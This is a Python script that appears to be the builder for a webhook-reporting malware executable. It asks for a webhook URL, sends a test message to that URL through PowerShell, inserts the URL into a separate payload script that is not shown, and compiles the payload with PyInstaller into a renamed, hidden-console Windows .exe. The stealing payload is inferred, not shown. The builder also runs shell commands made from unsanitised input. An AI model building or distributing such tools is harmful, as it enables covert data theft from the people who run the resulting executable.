import os
import shutil
import subprocess
from colorama import Fore, Style, init
import time
import sys

# Initialize colorama
init(autoreset=True)

def display_ascii_art():
    ascii_art = r"""
      _,---.     _,.---._       _,.---._                
  _.='.'-,  \  ,-.' , -  `.   ,-.' , -  `.    _..---.   
 /==.'-     / /==/_,  ,  - \ /==/_,  ,  - \ .' .'.-. \  
/==/ -   .-' |==|   .=.     |==|   .=.     /==/- '=' /  
|==|_   /_,-.|==|_ : ;=:  - |==|_ : ;=:  - |==|-,   '   
|==|  , \_.' )==| , '='     |==| , '='     |==|  .=. \  
\==\-  ,    ( \==\ -    ,_ / \==\ -    ,_ //==/- '=' ,| 
 /==/ _  ,  /  '.='. -   .'   '.='. -   .'|==|   -   /  
 `--`------'     `--`--''       `--`--''  `-._`.___,'   
    """
    print(Fore.LIGHTBLUE_EX + ascii_art)

# Cool loading animation with dynamic spinner and alternating colors
def loading_animation(message, color_sequence=None, duration=5):
    if color_sequence is None:
        color_sequence = [Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX]

    spinner = ['|', '/', '-', '\\']  # Spinner pattern
    end_time = time.time() + duration  # Duration for the animation

    print(color_sequence[0] + message, end=" ", flush=True)

    i = 0  # Spinner index
    while time.time() < end_time:
        # Cycle through the colors and spinner symbols
        color = color_sequence[i % len(color_sequence)]
        sys.stdout.write(color + spinner[i % len(spinner)])  # Print spinner
        sys.stdout.flush()
        time.sleep(0.1)
        sys.stdout.write('\b')  # Erase spinner
        i += 1  # Move to next spinner symbol

    print()  # Just move to the next line, don't say "Done!"

def main():
    # Display ASCII art
    display_ascii_art()

    # Prompt the user to enter the webhook URL
    webhook = input(Fore.LIGHTGREEN_EX + "Enter the webhook URL: ")

    # Ask if the user wants to test the webhook
    test_webhook = input(Fore.LIGHTGREEN_EX + "Do you want to test the webhook? (y/n): ").strip().lower()
    if test_webhook == 'y':
        loading_animation("Testing the webhook", duration=3)
        
        # Test the webhook using subprocess
        test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
        result = subprocess.run(test_command, shell=True)  # Using subprocess.run()

        if result.returncode != 0:
            print(Fore.RED + "Webhook is not valid.")
            input("Press any key to exit...")
            return
        else:
            print(Fore.LIGHTGREEN_EX + "Webhook is valid. Proceeding with the build.")
    else:
        print(Fore.LIGHTYELLOW_EX + "Skipping webhook test.")

    # Copy script.py to script_backup.py
    shutil.copyfile("SRC/script.py", "SRC/script_backup.py")

    # Replace {{WEBHOOK}} in script.py with the webhook URL
    with open("SRC/script.py", 'r') as file:
        script_content = file.read()
    script_content = script_content.replace('{{WEBHOOK}}', webhook)
    with open("SRC/script.py", 'w') as file:
        file.write(script_content)

    # Prompt the user if they want to rename the output executable
    while True:
        rename = input(Fore.LIGHTGREEN_EX + "Do you want to rename the output executable? (y/n): ").strip().lower()
        if rename == 'y':
            newname = input(Fore.LIGHTGREEN_EX + "Enter the new name for the executable (without extension): ").strip()
            output_file = f"dist/{newname}.exe"
            break
        elif rename == 'n':
            output_file = "dist/script.exe"
            break
        else:
            print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')

    # Build the executable
    loading_animation("Building the executable", [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTYELLOW_EX], duration=5)  # Cool loading animation

    # Compilation starts immediately after the animation without "Done!" message
    build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/script.py --name {'script' if rename == 'n' else newname}"
    subprocess.run(build_command, shell=True)  # Using subprocess.run()

    # Restore the original script
    shutil.copyfile("SRC/script_backup.py", "SRC/script.py")
    os.remove("SRC/script_backup.py")

    print(Fore.LIGHTCYAN_EX + f"Build complete! The executable is in the 'dist' folder as '{output_file}'.")
    input("Press any key to exit...")

if __name__ == "__main__":
    main()
